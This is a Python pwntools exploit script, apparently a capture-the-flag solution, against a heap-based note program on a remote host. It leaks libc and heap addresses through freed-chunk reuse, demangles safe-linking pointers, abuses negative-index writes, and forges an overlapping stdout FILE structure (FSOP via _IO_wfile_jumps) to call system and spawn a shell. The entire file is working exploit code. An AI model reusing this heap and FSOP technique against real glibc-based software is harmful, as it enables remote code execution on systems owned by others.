#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '65.109.190.95', 10110

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def add(title, length, content, newline=True):
    if length > 0x501:
        log.failure("add: invalid size")
        return
    io.sendlineafter(b'>', b'1')
    if newline:
        io.sendlineafter(b':', title)
        io.sendlineafter(b':', str(length).encode())
    else:
        io.sendafter(b':', title)
        io.sendafter(b':', str(length).encode())
    io.sendlineafter(b':', content)

def delete(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', str(idx).encode())

def modify(idx, length, content):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(length).encode())
    io.sendlineafter(b':', content)

def view(idx):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b':', str(idx).encode())

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

heap = 0x0
def exploit():
    global io
    io = initialize()

    add(b'', 0x420, b'') # 0
    add(b'', 0x20, b'') # 1
    add(b'', 0x20, b'') # 2

    # ===========================
    # LEAK LIBC
    # ===========================
    delete(0)
    add(b'', 0x420, b'') # 0
    view(0)
    io.recvuntil(b'Content: ')
    libc.address = u64(io.recv(6) + b'\x00\x00') - 0x203b0a

    # ===========================
    # LEAK HEAP
    # ===========================
    delete(2)
    delete(1)
    add(b'', 0x20, b'') # 1
    # add(b'', 0x20, b'') # 2
    view(1)
    io.recvuntil(b'Content: ')
    heap = demangle(u64(io.recv(6) + b'\x00\x00')) & ~0xfff

    # ===========================
    # FSOP
    # ===========================
    modify(-3, 0x18, p64(0x0) + p64(0x300))

    # copied payload from Ã¥ngstrom 2024 - heapify
    # crafting overlapping IO_FILE, wide_data and wide_vtable
    fp = libc.sym['_IO_2_1_stdout_']
    overlap = b'  sh\x00\x00\x00\x00' # [FILE] _flags | [WIDE DATA] read_ptr
    overlap += flat([
        p64(0x0),               # [WIDE DATA] read_end
        p64(0x0),               # [WIDE DATA] read_base
        p64(0x0),               # [WIDE DATA] write_base
        p64(0x0),               # [WIDE DATA] write_ptr
        p64(0x0),               # [WIDE DATA] write_end
        p64(0x0),               # [WIDE DATA] buf_base
        p64(0x0),               # [WIDE DATA] buf_end 
        p64(0x0),               # [WIDE DATA] save_base
        p64(0x0),               # [WIDE DATA] backup_base 
        p64(0x0),               # [WIDE DATA] save_end
    ])
    overlap += b'\x00' * 8       # [WIDE DATA] state
    overlap += b'\x00' * 8       # [WIDE DATA] last_state

    codecvt = b''
    codecvt += p64(libc.sym['system'])     # [FILE] _chain | [WIDE DATA] codecvt | [VTABLE] __doallocate (at function authenticate, skips the puts because we overwrote stdout)
    codecvt += b'\x00' * 0x18                   # padding
    codecvt += p64(fp - 0x10)                   # [FILE] _lock
    codecvt += p64(0x0) * 2                     # padding
    codecvt += p64(fp+0x8)                      # [FILE] _wide_data
    codecvt += b'\x00' * (0x18 + 4 + 20)        # padding
    codecvt += p64(libc.sym['_IO_wfile_jumps']) # [FILE] vtable
    codecvt += b'\x00' * (0x70 - len(codecvt))  # padding
    
    overlap += codecvt
    overlap += p64(0x0)                         # [WIDE DATA] wchar_t shortbuf[1] (alligned to 8 bytes)
    overlap += p64(fp)                          # [WIDE DATA] vtable

    modify(-2, 0x200, overlap)

    io.sendline(b'cat flag*')

    log.info("libc base: %#x", libc.address)
    log.info("heap base: %#x", heap)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
